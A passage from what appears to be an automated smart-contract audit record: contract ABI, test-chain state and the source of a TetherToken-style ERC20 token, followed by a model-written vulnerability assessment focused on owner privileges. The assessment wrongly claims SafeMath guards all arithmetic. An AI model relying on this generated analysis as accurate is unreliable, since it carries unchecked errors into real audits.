false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and fee parameters. It inherits from several contracts:  \n- Ownable: ownership management  \n- BasicToken and StandardToken: ERC20 token logic with fee deduction on transfers  \n- Pausable: emergency stop mechanism controlled by owner  \n- BlackList: ability to blacklist addresses and destroy their token balances  \n- UpgradedStandardToken interface: for forwarding calls to an upgraded token contract if deprecated  \n\nKey features and logic:  \n- The token supply is initially assigned to the owner.  \n- Transfers and transferFrom apply fees (basisPointsRate and maximumFee), which go to the owner.  \n- The contract can be paused/unpaused by the owner, disabling transfers when paused.  \n- Blacklisted addresses cannot transfer tokens, and their balances can be destroyed by the owner.  \n- The contract supports deprecation: forwarding calls to a new upgraded contract address.  \n- Owner can issue new tokens or redeem tokens from their balance.  \n- Fee parameters are capped (basisPointsRate < 20, maximumFee < 50 tokens).  \n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2. Vulnerability Assessment:  \n\n**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the contract.  \n- This centralization means users must fully trust the owner not to abuse these powers.  \n- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  \n- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  \n\n**B. Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  \n- There is no mechanism for the blacklisted user to contest or recover funds.  \n- Blacklisting is controlled solely by the owner, no multisig or governance.  \n\n**C. Deprecated Contract Upgrade Mechanism**  \n- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  \n- The upgrade address is trusted and controlled by the owner.  \n- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  \n- No user consent or governance over upgrade.  \n\n**D. Fee Mechanism**  \n- Fees are deducted on transfers and transferFrom, sent to the owner.  \n- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  \n- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  \n- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  \n\n**E. ERC20 Approve Race Condition**  \n- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is a standard pattern and acceptable.  \n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  \n- No payable functions accepting ETH, so no direct ETH theft risk.  \n\n**G. Pausable Mechanism**  \n- Owner can pause/unpause contract, disabling transfers during pause.  \n- No risk here, but again centralized control.  \n\n---\n\n3. Exploitation Requirements:  \n\n- To exploit the contract, an attacker would need to gain control of the owner account or compromise the owner‚Äôs private key.  \n- With owner control, the attacker can:  \n  - Blacklist arbitrary addresses and destroy their token balances, causing permanent loss.  \n  - Mint unlimited tokens via `issue()`, causing inflation and devaluing existing tokens.  \n  - Set high fees within allowed limits to extract value from transfers.  \n  - Deprecate the contract and set a malicious upgrade address to hijack token operations.  \n  - Pause the contract to freeze all transfers.  \n\n- Without owner control, no direct vulnerabilities allow stealing tokens or bypassing restrictions.  \n- Users must trust the owner not to abuse these powerful administrative functions.  \n\n---\n\n**Summary:**  \nThe TetherToken contract is a centralized ERC20 token with owner-controlled blacklisting, minting, pausing, and upgrade mechanisms. The main vulnerabilities stem from the extensive privileges granted to the owner, which can be abused to confiscate tokens, inflate supply, freeze transfers, or hijack the token via upgrade. No technical bugs like reentrancy or math errors are present. The security risk is primarily trust and governance related.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'contract_analysis': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and fee parameters. It inherits from several contracts:  \n- Ownable: ownership management  \n- BasicToken and StandardToken: ERC20 token logic with fee deduction on transfers  \n- Pausable: emergency stop mechanism controlled by owner  \n- BlackList: ability to blacklist addresses and destroy their token balances  \n- UpgradedStandardToken interface: for forwarding calls to an upgraded token contract if deprecated  \n\nKey features and logic:  \n- The token supply is initially assigned to the owner.  \n- Transfers and transferFrom apply fees (basisPointsRate and maximumFee), which go to the owner.  \n- The contract can be paused/unpaused by the owner, disabling transfers when paused.  \n- Blacklisted addresses cannot transfer tokens, and their balances can be destroyed by the owner.  \n- The contract supports deprecation: forwarding calls to a new upgraded contract address.  \n- Owner can issue new tokens or redeem tokens from their balance.  \n- Fee parameters are capped (basisPointsRate < 20, maximumFee < 50 tokens).  \n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.', 'vulnerability_assessment': '**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the contract.  \n- This centralization means users must fully trust the owner not to abuse these powers.  \n- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  \n- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  \n\n**B. Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  \n- There is no mechanism for the blacklisted user to contest or recover funds.  \n- Blacklisting is controlled solely by the owner, no multisig or governance.  \n\n**C. Deprecated Contract Upgrade Mechanism**  \n- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  \n- The upgrade address is trusted and controlled by the owner.  \n- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  \n- No user consent or governance over upgrade.  \n\n**D. Fee Mechanism**  \n- Fees are deducted on transfers and transferFrom, sent to the owner.  \n- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  \n- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  \n- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  \n\n**E. ERC20 Approve Race Condition**  \n- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is a standard pattern and acceptable.  \n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  \n- No payable functions accepting ETH, so no direct ETH theft risk.  \n\n**G. Pausable Mechanism**  \n- Owner can pause/unpause contract, disabling transfers during pause.  \n- No risk here, but again centralized control.  \n\n---\n\n3.', 'exploitation_requirements': '- To exploit the contract, an attacker would need to gain control of the owner account or compromise the owner‚Äôs private key.  \n- With owner control, the attacker can:  \n  - Blacklist arbitrary addresses and destroy their token balances, causing permanent loss.  \n  - Mint unlimited tokens via `issue()`, causing inflation and devaluing existing tokens.  \n  - Set high fees within allowed limits to extract value from transfers.  \n  - Deprecate the contract and set a malicious upgrade address to hijack token operations.  